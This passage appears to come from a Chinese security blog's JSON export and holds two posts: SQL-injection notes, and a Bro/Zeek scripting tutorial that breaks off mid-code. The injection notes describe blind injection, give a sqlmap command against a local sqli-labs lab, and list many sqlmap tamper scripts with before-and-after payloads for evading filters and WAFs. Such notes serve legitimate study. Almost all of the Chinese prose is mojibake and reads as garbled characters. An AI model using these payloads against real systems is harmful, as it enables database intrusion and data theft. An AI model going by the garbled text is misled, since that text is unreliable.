ä¸ºmysqlæœ¬èº«å°±æœ‰å…­ä¸ªæ•°æ®åº“ä½†worldã€testã€sakilaè¿™ä¸‰ä¸ªæ•°æ®åº“æ²¡ä»€ä¹ˆç”¨å¯ä»¥åˆ é™¤ï¼Œé‚£ä¹ˆæœ€å°‘åº”è¯¥æœ‰ä¸‰ä¸ªæ•°æ®åº“ï¼Œperformance_schemaå’Œinformation_schemaå’Œmysqlã€‚ å‡å¦‚æ•°æ®åº“çš„æ•°é‡æ˜¯&gt;3çš„è¯ï¼Œé‚£ä¹ˆå°±ç›¸å½“äº1' and trueè¿”å›é¡µé¢ä¸ä¼šå‡ºç°é—®é¢˜ï¼Œå¦‚æœè¿”å›é¡µé¢ä¸æ˜¯æ­£ç¡®é¡µé¢çš„è¯æˆ‘ä»¬å°±å¯ä»¥ç¡®å®šä¸€å…±æœ‰ä¸‰ä¸ªæ•°æ®åº“ï¼ˆéƒ½æ˜¯é»˜è®¤çš„ï¼‰æˆ–è€…æ˜¯ç”±10å¤šä¸ªæ•°æ®åº“ï¼ˆ20å¤šä¸ªä¹Ÿæ˜¯æœ‰å¯èƒ½çš„ï¼‰ï¼Œåä½æ˜¯1,2æ€»ä¹‹æ˜¯å°äºç­‰äº3çš„ã€‚ å†è·å–æ¯ä¸ªæ•°æ®åº“åï¼ˆè¿™é‡Œä¹Ÿmysqlä¸ºä¾‹ï¼‰ï¼š å…¶å®é“ç†å’Œä¸Šè¿°çš„ä¸€æ ·è¿›è¡ŒçŒœè§£ï¼Œé€šè¿‡åˆ¤æ–­æ¯ä¸€ä½çš„ASCIIç å€¼æ¥ç¡®å®šæ¯ä¸ªå­—æ¯ã€‚ å†ä»¥sqlilabä¸­çš„Less-4ä¸ºä¾‹ï¼ˆåŸºäºé”™è¯¯çš„GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥ï¼‰ï¼ŒæŸ¥çœ‹sqlmapä¸­ä½¿ç”¨çš„payloadsï¼Œæ‰§è¡Œå‘½ä»¤ï¼š 1python sqlmap.py -v 3 -u &quot;http://localhost/sqlilabs/Less-4/?id=1&quot; --level 4 --dbs --dbms=&quot;MySQL&quot; SQLMapæ‰§è¡Œçš„payloadå¦‚ä¸‹æ‰€ç¤ºï¼š 0x03 SQLMap Tamper SQLMapçš„tamperä½¿ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š 1sql -u [url] --tamper [æ¨¡å—å] å¸¸ç”¨çš„tamperè„šæœ¬ apostrophemask.py é€‚ç”¨æ•°æ®åº“ï¼šALL ä½œç”¨ï¼šå°†å¼•å·æ›¿æ¢ä¸ºutf-8ï¼Œç”¨äºè¿‡æ»¤å•å¼•å· ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1 AND â€˜1â€™='1â€) ä½¿ç”¨è„šæœ¬åï¼š1 AND %EF%BC%871%EF%BC%87=%EF%BC%871 base64encode.py é€‚ç”¨æ•°æ®åº“ï¼šALL ä½œç”¨ï¼šæ›¿æ¢ä¸ºbase64ç¼–ç  ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1â€™ AND SLEEP(5)#â€) ä½¿ç”¨è„šæœ¬åï¼šMScgQU5EIFNMRUVQKDUpIw== multiplespaces.py é€‚ç”¨æ•°æ®åº“ï¼šALL ä½œç”¨ï¼šå›´ç»•sqlå…³é”®å­—æ·»åŠ å¤šä¸ªç©ºæ ¼ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 UNION SELECT foobarâ€™) ä½¿ç”¨è„šæœ¬åï¼š1 UNION SELECT foobar space2plus.py é€‚ç”¨æ•°æ®åº“ï¼šALL ä½œç”¨ï¼šç”¨åŠ å·æ›¿æ¢ç©ºæ ¼ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™) ä½¿ç”¨è„šæœ¬åï¼šSELECT+id+FROM+users nonrecursivereplacement.py é€‚ç”¨æ•°æ®åº“ï¼šALL ä½œç”¨ï¼šä½œä¸ºåŒé‡æŸ¥è¯¢è¯­å¥ï¼Œç”¨åŒé‡è¯­å¥æ›¿ä»£é¢„å®šä¹‰çš„sqlå…³é”®å­—ï¼ˆé€‚ç”¨äºéå¸¸å¼±çš„è‡ªå®šä¹‰è¿‡æ»¤å™¨ï¼Œä¾‹å¦‚å°† selectæ›¿æ¢ä¸ºç©ºï¼‰ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 UNION SELECT 2â€“â€™) ä½¿ç”¨è„šæœ¬åï¼š1 UNIOUNIONN SELESELECTCT 2â€“ space2randomblank.py é€‚ç”¨æ•°æ®åº“ï¼šALL ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºå…¶ä»–æœ‰æ•ˆå­—ç¬¦ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™) ä½¿ç”¨è„šæœ¬åï¼šSELECT%0Did%0DFROM%0Ausers unionalltounion.py é€‚ç”¨æ•°æ®åº“ï¼šALL ä½œç”¨ï¼šå°†union allselect æ›¿æ¢ä¸ºunionselect ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€™-1 UNION ALL SELECTâ€™) ä½¿ç”¨è„šæœ¬åï¼š-1 UNION SELECT securesphere.py é€‚ç”¨æ•°æ®åº“ï¼šALL ä½œç”¨ï¼šè¿½åŠ ç‰¹å®šçš„å­—ç¬¦ä¸² ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 1=1â€™) ä½¿ç”¨è„šæœ¬åï¼š1 AND 1=1 and â€˜0havingâ€™=â€˜0havingâ€™ space2dash.py é€‚ç”¨æ•°æ®åº“ï¼šALL ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºâ€“ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227=9227â€™) ä½¿ç”¨è„šæœ¬åï¼š1â€“nVNaVoPYeva%0AANDâ€“ngNvzqu%0A9227=9227 space2mssqlblank.py é€‚ç”¨æ•°æ®åº“ï¼šMicrosoft SQL Server æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000ã€Microsoft SQL Server 2005 ä½œç”¨ï¼šå°†ç©ºæ ¼éšæœºæ›¿æ¢ä¸ºå…¶ä»–ç©ºæ ¼ç¬¦å·(â€™%01â€™, â€˜%02â€™, â€˜%03â€™, â€˜%04â€™, â€˜%05â€™, â€˜%06â€™, â€˜%07â€™, â€˜%08â€™, â€˜%09â€™, â€˜%0Bâ€™, â€˜%0Câ€™, â€˜%0Dâ€™, â€˜%0Eâ€™, â€˜%0Fâ€™, â€˜%0Aâ€™) ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™) ä½¿ç”¨è„šæœ¬åï¼šSELECT%0Eid%0DFROM%07users percentage.py é€‚ç”¨æ•°æ®åº“ï¼šASP æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000, 2005ã€MySQL 5.1.56, 5.5.11ã€PostgreSQL 9.0 ä½œç”¨ï¼šåœ¨æ¯ä¸ªå­—ç¬¦å‰æ·»åŠ ä¸€ä¸ª% ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD FROM TABLEâ€™) ä½¿ç”¨è„šæœ¬åï¼š%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E sp_password.py é€‚ç”¨æ•°æ®åº“ï¼šMSSQL ä½œç”¨ï¼šä»T-SQLæ—¥å¿—çš„è‡ªåŠ¨è¿·ç³Šå¤„ç†çš„æœ‰æ•ˆè½½è·ä¸­è¿½åŠ sp_password ä½¿ç”¨è„šæœ¬å‰ï¼štamper('1 AND 9227=9227-- ') ä½¿ç”¨è„šæœ¬åï¼š1 AND 9227=9227-- sp_password charencode.py æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€ PostgreSQL 8.3, 8.4, 9.0 ä½œç”¨ï¼šå¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨urlç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD FROM%20TABLEâ€™) ä½¿ç”¨è„šæœ¬åï¼š%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45 randomcase.py æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€ PostgreSQL 8.3, 8.4, 9.0 ä½œç”¨ï¼šéšæœºå¤§å°å†™ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜INSERTâ€™) ä½¿ç”¨è„šæœ¬åï¼šINseRt charunicodeencode.py é€‚ç”¨æ•°æ®åº“ï¼šASPã€ASP.NET æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000/2005ã€MySQL 5.1.56ã€PostgreSQL 9.0.3 ä½œç”¨ï¼šé€‚ç”¨å­—ç¬¦ä¸²çš„unicodeç¼–ç  ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD%20FROM TABLEâ€™) ä½¿ç”¨è„šæœ¬åï¼š %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u 0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045 space2comment.py æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0 ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º/**/ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™) ä½¿ç”¨è„šæœ¬åï¼šSELECT/**/id/**/FROM/**/users equaltolike.py æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5 ä½œç”¨ï¼šå°†=æ›¿æ¢ä¸ºLIKE ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT * FROM users WHERE id=1â€™) ä½¿ç”¨è„šæœ¬åï¼šSELECT * FROM users WHERE id LIKE 1 equaltolike.py æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0 ä½œç”¨ï¼šå°†&gt;æ›¿æ¢ä¸ºGREATESTï¼Œç»•è¿‡å¯¹&gt;çš„è¿‡æ»¤ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND A &gt; Bâ€™) ä½¿ç”¨è„šæœ¬åï¼š1 AND GREATEST(A,B+1)=A ifnull2ifisnull.py é€‚ç”¨æ•°æ®åº“ï¼šMySQLã€SQLite (possibly)ã€SAP MaxDB (possibly) æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0 and 5.5 ä½œç”¨ï¼šå°†ç±»ä¼¼äºIFNULL(A, B)æ›¿æ¢ä¸ºIF(ISNULL(A), B, A)ï¼Œç»•è¿‡å¯¹IFNULLçš„è¿‡æ»¤ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜IFNULL(1, 2)â€™) ä½¿ç”¨è„šæœ¬åï¼šIF(ISNULL(1),2,1) modsecurityversioned.py é€‚ç”¨æ•°æ®åº“ï¼šMySQL æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0 ä½œç”¨ï¼šè¿‡æ»¤ç©ºæ ¼ï¼Œä½¿ç”¨mysqlå†…è”æ³¨é‡Šçš„æ–¹å¼è¿›è¡Œæ³¨å…¥ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 2&gt;1â€“â€™) ä½¿ç”¨è„šæœ¬åï¼š1 /!30874AND 2&gt;1/â€“ space2mysqlblank.py é€‚ç”¨æ•°æ®åº“ï¼šMySQL æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1 ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºå…¶ä»–ç©ºæ ¼ç¬¦å·(â€™%09â€™, â€˜%0Aâ€™, â€˜%0Câ€™, â€˜%0Dâ€™, â€˜%0Bâ€™) ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™) ä½¿ç”¨è„šæœ¬åï¼šSELECT%0Bid%0DFROM%0Cusers modsecurityzeroversioned.py é€‚ç”¨æ•°æ®åº“ï¼šMySQL æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0 ä½œç”¨ï¼šä½¿ç”¨å†…è”æ³¨é‡Šæ–¹å¼ï¼ˆ/!00000/ï¼‰è¿›è¡Œæ³¨å…¥ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 2&gt;1â€“â€™) ä½¿ç”¨è„šæœ¬åï¼š1 /!00000AND 2&gt;1/â€“ space2mysqldash.py é€‚ç”¨æ•°æ®åº“ï¼šMySQLã€MSSQL ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º â€“ ï¼Œå¹¶è¿½éšä¸€ä¸ªæ¢è¡Œç¬¦ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227=9227â€™) ä½¿ç”¨è„šæœ¬åï¼š1â€“%0AANDâ€“%0A9227=9227 bluecoat.py é€‚ç”¨æ•°æ®åº“ï¼šBlue Coat SGOS æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1,ã€SGOS ä½œç”¨ï¼šåœ¨sqlè¯­å¥ä¹‹åç”¨æœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦ï¼Œéšåç”¨LIKEæ›¿æ¢= ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM users where id = 1â€™) ä½¿ç”¨è„šæœ¬åï¼šSELECT%09id FROM users where id LIKE 1 versionedkeywords.py é€‚ç”¨æ•°æ®åº“ï¼šMySQL æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4.0.18, 5.1.56, 5.5.11 ä½œç”¨ï¼šæ³¨é‡Šç»•è¿‡ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#â€™) ä½¿ç”¨è„šæœ¬åï¼š1/!UNION//!ALL//!SELECT//!NULL/,/!NULL/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/!AS//!CHAR/),CHAR( 32)),CHAR(58,100,114,117,58))# halfversionedmorekeywords.py é€‚ç”¨æ•°æ®åº“ï¼šMySQL &lt; 5.1 æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4.0.18/5.0.22 ä½œç”¨ï¼šåœ¨æ¯ä¸ªå…³é”®å­—å‰æ·»åŠ mysqlç‰ˆæœ¬æ³¨é‡Š ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œvalueâ€™ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND â€˜QDWaâ€™='QDWaâ€) ä½¿ç”¨è„šæœ¬åï¼š valueâ€™/!0UNION/!0ALL/!0SELECT/!0CONCAT(/!0CHAR(58,107,112,113,58),/!0IFNUL L(CAST(/!0CURRENT_USER()/!0AS/!0CHAR),/!0CHAR(32)),/!0CHAR(58,97,110,121,58 )),/!0NULL,/!0NULL#/!0AND â€˜QDWaâ€™='QDWa space2morehash.py é€‚ç”¨æ•°æ®åº“ï¼šMySQL &gt;= 5.1.13 æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1.41 ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º#ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227=9227â€™) ä½¿ç”¨è„šæœ¬åï¼š1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227 apostrophenullencode.py é€‚ç”¨æ•°æ®åº“ï¼šALL ä½œç”¨ï¼šç”¨éæ³•åŒå­—èŠ‚Unicodeå­—ç¬¦æ›¿æ¢å•å¼•å· ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1 AND â€˜1â€™='1â€) ä½¿ç”¨è„šæœ¬åï¼š1 AND %00%271%00%27=%00%271 appendnullbyte.py é€‚ç”¨æ•°æ®åº“ï¼šALL ä½œç”¨ï¼šåœ¨æœ‰æ•ˆè½½è·çš„ç»“æŸä½ç½®åŠ è½½nullå­—èŠ‚å­—ç¬¦ç¼–ç  ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 1=1â€™) ä½¿ç”¨è„šæœ¬åï¼š1 AND 1=1%00 chardoubleencode.py é€‚ç”¨æ•°æ®åº“ï¼šALL ä½œç”¨ï¼šå¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨åŒé‡urlç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD FROM%20TABLEâ€™) ä½¿ç”¨è„šæœ¬åï¼š %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F %254D%2520%2554%2541%2542%254C%2545 unmagicquotes.py é€‚ç”¨æ•°æ®åº“ï¼šALL ä½œç”¨ï¼šç”¨ä¸€ä¸ªå¤šå­—èŠ‚ç»„åˆ%bf%27å’Œæœ«å°¾é€šç”¨æ³¨é‡Šä¸€èµ·æ›¿æ¢ç©ºæ ¼ ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1â€™ AND 1=1â€) ä½¿ç”¨è„šæœ¬åï¼š1%bf%27 AND 1=1â€“ randomcomments.py é€‚ç”¨æ•°æ®åº“ï¼šALL ä½œç”¨ï¼šç”¨æ³¨é‡Šç¬¦åˆ†å‰²sqlå…³é”®å­— ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜INSERTâ€™) ä½¿ç”¨è„šæœ¬åï¼šI//N//SERT","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://ca0y1h.top/tags/SQL%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Broè¯­æ³•å­¦ä¹ ä¹‹åŸºç¡€çŸ¥è¯†","date":"2019-09-23T13:15:23.000Z","path":"Web_security/traffic_analysis/3.Broè¯­æ³•å­¦ä¹ ä¹‹åŸºç¡€çŸ¥è¯†/","text":"Broè¯­æ³•å­¦ä¹ ä¹‹åŸºç¡€çŸ¥è¯† æœ€è¿‘ä¸€ä¸ªé¡¹ç›®ä½¿ç”¨åˆ°äº†Broå’ŒArgusè¿™ä¸¤ä¸ªå¼€æºçš„æµé‡åˆ†æå·¥å…·ï¼Œå‰è€…ç°åœ¨æ”¹åä¸ºZeekï¼Œåè€…åœ¨2015å¹´åœæ­¢äº†ç»´æŠ¤ã€‚å€Ÿæ­¤æœºä¼šç®€å•çš„ä»‹ç»ä¸€ä¸‹Broè„šæœ¬çš„åŸºæœ¬è¯­æ³•ï¼Œåé¢æœ‰æ—¶é—´çš„è¯ä¼šå†å†™ä¸€æœ¬å…³äºé€šè¿‡ç¼–å†™è„šæœ¬è‡ªå®šä¹‰æ—¥å¿—æ–‡ä»¶çš„æ–‡ç« ã€‚ http://try.zeek.org/ Hello World Zeekæ˜¯åŸºäºäº‹ä»¶ï¼ˆeventï¼‰é©±åŠ¨çš„ï¼Œä¹Ÿå°±è¯´ï¼Œä½ å¯ä»¥é€šè¿‡äº‹ä»¶è§¦å‘æ¥æ§åˆ¶ä»»ä½•è¦æ‰§è¡Œçš„åŠ¨ä½œã€‚è¿™é‡Œä»¥bro_init()å’Œbro_done()è¿™ä¸¤ä¸ªäº‹ä»¶ä¸¾ä¾‹ï¼š 123456789event bro_init() &#123; print &quot;Hello, World&quot;; &#125; event bro_done() &#123; print &quot;Goodbye, World&quot;; &#125; bro_init()å’Œbro_done()éƒ½æ˜¯åŸºæœ¬äº‹ä»¶ï¼Œå½“Zeekå¼€å§‹è¿è¡Œæ—¶ä¼šæ‰§è¡Œbro_init()äº‹ä»¶ï¼Œå½“Zeekåœæ­¢è¿è¡Œæ—¶ä¼šæ‰§è¡Œbro_done()äº‹ä»¶ã€‚ è¿™é‡Œè¿˜æœ‰æ›´å¤šçš„ZeekåŸºæœ¬äº‹ä»¶ã€‚ åŠ è½½è„šæœ¬ åƒå…¶ä»–çš„ç¼–ç¨‹è¯­è¨€ä¸€æ ·ï¼ŒZeekä¹Ÿå¯ä»¥é€šè¿‡@loadå…³é”®å­—æ¥åŠ è½½å…¶ä»–è„šæœ¬ä¸­çš„ä»£ç ã€‚å³ï¼š 1@load misc&#x2F;dump-events misc/dump-eventsè¿™ä¸ªè„šæœ¬å°†Zeekäº§ç”Ÿçš„äº‹ä»¶ä»¥å¯è¯»çš„å½¢å¼å±•ç°å‡ºæ¥ï¼Œé€šå¸¸ç”¨äºè°ƒè¯•ä»¥åŠç†è§£äº‹ä»¶åŠå…¶å‚æ•°ã€‚éƒ¨åˆ†è¾“å‡ºå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å‡½æ•° é¦–å…ˆæ¥çœ‹ä¸€ä¸ªç¤ºä¾‹ï¼š 123456789101112# Function implementationfunction emphasize(s: string, p: string &amp;default &#x3D; &#39;*&#39;): string &#123; return p + s + p; &#125; envent bro_init() &#123; # Function calls print emphasize(&quot;yes&quot;); print emphasize(&quot;no&quot;, &quot;_&quot;); &#125; è¾“å‡ºï¼š 12*yes*_no_ æœ‰å…¶ä»–ç¼–ç¨‹ç»éªŒçš„åŒå­¦çœ‹è¿™ä¸ªä¾‹å­åº”è¯¥æ¯”è¾ƒå¥½ç†è§£ã€‚è¿™é‡Œç®€å•è¯´ä¸€ä¸‹emphasize()å‡½æ•°ï¼Œå®ƒæ¥æ”¶ä¸¤ä¸ªStringç±»å‹çš„å‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æœ‰ä¸€ä¸ªé»˜è®¤å€¼*ï¼ˆç”¨&amp;defaultå…³é”®å­—ä¿®é¥°ï¼‰ï¼Œå³å¯é€‰å‚æ•°ï¼Œå¹¶è§„å®šäº†è¿”å›å€¼ç±»å‹æ˜¯Stringã€‚ å¦å¤–ä¸€ç‚¹ï¼ŒZeekå¯ä»¥ç›´æ¥ä½¿ç”¨+æ¥æ‹¼æ¥å­—ç¬¦ä¸²ã€‚ Another side note on the relation between functions and events: Events are a kind of function as well, and both can only be declared at the global level; one cannot nest them. å˜é‡ å…³äºå˜é‡çš„ä½œç”¨åŸŸï¼ŒZeekæä¾›äº†ä¸¤ç§å…³é”®å­—æ¥ä¿®é¥°å˜é‡ï¼šlocalå’Œglobalã€‚å…·ä½“ç¤ºä¾‹å¦‚ä¸‹ï¼š 12345678910111213141516171819global x &#x3D; &#39;Hello&#39;;event bro_init() &#123; print x; const y &#x3D; &quot;Guten Tag&quot;; # Changing value of &#39;y&#39; is not allowed. #y &#x3D; &quot;Nope&quot;; local z &#x3D; &quot;What does that mean?&quot;; print z; &#125; event bro_done() &#123; x &#x3D; &quot;Bye&quot;; print x; &#125; è¾“å‡ºï¼š 123HelloWhat does that mean?Bye å¯ä»¥çœ‹åˆ°ï¼Œç”¨localä¿®é¥°çš„å˜é‡çš„ä½œç”¨åŸŸä¸¥æ ¼é™åˆ¶åœ¨å‡½æ•°ä½“å†…ï¼Œglobalç±»ä¼¼äºå…¨å±€å˜é‡çš„æ•ˆæœï¼Œå¦‚æœåœ¨å‡½æ•°å†…éƒ¨å®šä¹‰äº†ä¸€ä¸ªä¸å…¨å±€å˜é‡ç›¸åŒçš„å±€éƒ¨å˜é‡ï¼Œé‚£ä¹ˆå±€éƒ¨å˜é‡ä¼šè¦†ç›–å…¨å±€å˜é‡ã€‚ å¦å¤–ï¼Œç”¨constä¿®é¥°çš„å˜é‡ç›¸å½“äºå¸¸æ•°ï¼Œæ˜¯ä¸å¯æ›´æ”¹çš„ã€‚ åŸå§‹æ•°æ®ç±»å‹ å¯¹äºå˜é‡çš„æ•°æ®ç±»å‹ï¼ŒZeekå’ŒCã€Javaç­‰è¯­è¨€ç›¸ä¼¼ï¼Œå³ä¸€ä¸ªå˜é‡ä¿å­˜çš„æ•°æ®ç±»å‹æ˜¯å›ºå®šçš„ï¼Œå¹¶ä¸”å®ƒå¯ä»¥ä»ä½ çš„èµ‹å€¼æ¥æ¨æ–­è¯¥å˜é‡çš„æ•°æ®ç±»å‹ï¼Œä¸ç”¨æ˜¾ç¤ºåœ°å£°æ˜ï¼Œä¹Ÿå°±è¯´local x = 0å’Œlocal x: count = 0æ˜¯ç­‰ä»·çš„ã€‚ è¿™é‡Œåˆ—ä¸¾äº†Zeekæ”¯æŒçš„æ‰€æœ‰æ•°æ®ç±»å‹ã€‚ 1234567891011121314event bro_init() &#123; local x: string &#x3D; &quot;two&quot;; local y: int &#x3D; 10000000000000000000000000000000000000000000000000; print &quot;y is a large int:&quot;, y; print &quot;x is a short string:&quot;, x; #pattern matching print &#x2F;one|two|three&#x2F; &#x3D;&#x3D; &quot;two&quot;; print &#x2F;one|two|three&#x2F; &#x3D;&#x3D; &quot;ones&quot;; print &#x2F;one|two|three&#x2F; in ones; print &#x2F;[123].*&#x2F; &#x3D;&#x3D; &quot;2 two&quot;; print &#x2F;[123].*&#x2F; &#x3D;&#x3D; &quot;4 four&quot;; &#125; è¾“å‡ºï¼š 1234567y is a large int:, -1x is a short string:, twoTFTTF ä¸Šé¢ä¾‹å­çš„ç¬¬äºŒéƒ¨åˆ†ç»™æˆ‘ä»¬æ¼”ç¤ºäº†ä¸€ç§æ¨¡å¼åŒ¹é…ï¼ˆçœ‹èµ·æ¥æœ‰ç‚¹åƒæ­£åˆ™è¡¨è¾¾å¼ï¼‰ï¼Œä¸¤ä¸ª/ç¬¦å·ä¸­æ˜¯å¾…åŒ¹é…çš„å¼å­ï¼Œä¸åŒå…ƒç´ ç”¨|ç¬¦å·éš”å¼€ã€‚==æ˜¯ç²¾ç¡®åŒ¹é…ï¼Œinæ˜¯æ¨¡ç³ŠåŒ¹é…ï¼Œ[123].*åŒ¹é…ä»»æ„ä»¥123å…¶ä¸­æŸä¸€ä¸ªæ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²ã€‚ æ“ä½œç¬¦ æ•°å­¦æ“ä½œç¬¦ Name Syntax Example Usage åŠ  a + b print 2 + 2; # 4 å‡ a - b print 2 - 2; # 0 ä¹˜ a * b print 4 * 4; # 16 é™¤ a / b print 15 / 3; # 5 å–ä½™ a % b print 18 % 15; # 3 ä¸€å…ƒåŠ å· +a local a = +1; # Force use of a signed integer ä¸€å…ƒå‡å· -a local a = 5; print -a; # -5 è‡ªå¢ ++a local a = 1; print ++a, a; # 2, 2 è‡ªå‡ --a local a = 2; print --a, a; # 1, 1 èµ‹å€¼æ“ä½œç¬¦ Name Synatx Example Usage =èµ‹å€¼ a=b local a = 7; +èµ‹å€¼ a += b local a = 7; a += 2; # 9 -èµ‹å€¼ a -= b local a = 7; a -= 2; # 5 å…³ç³»æ“ä½œç¬¦ Name Syntax Example Usage Equality a == b print 2 == 2; # T ä¸ç­‰ a != b print 2 != 2; # F å°äº a &lt; b print 2 &lt; 3; # T å°äºç­‰äº a &lt;= b print 2 &lt;= 2; # T å¤§äº a &gt; b print 2 &gt; 3; # F å¤§äºç­‰äº a &gt;= b print 2 &gt;= 2; # T å…¶ä»–æ“ä½œç¬¦ Name Syntax Example Usage å­˜åœ¨äº a in b print &quot;z&quot; in &quot;test&quot;; # F ä¸å­˜åœ¨äº a !in b print &quot;z&quot; !in &quot;test&quot;; # T å¤§å°/é•¿åº¦ |a| print |&quot;test&quot;|; # 4 ç»å¯¹å€¼ |a| print |-5|; # 5 ç´¢å¼•å–å€¼ a[i] print &quot;test&quot;[2]; # s åˆ‡ç‰‡ a[i:j], a[i:], a[:j] print &quot;testing&quot;[2:4]; # st Ifè¯­å¥ 123456789101112131415161718event bro_init() &#123; local x &#x3D; &quot;3&quot;; for (c in &quot;12345&quot;) &#123; if (c &#x3D;&#x3D; x) 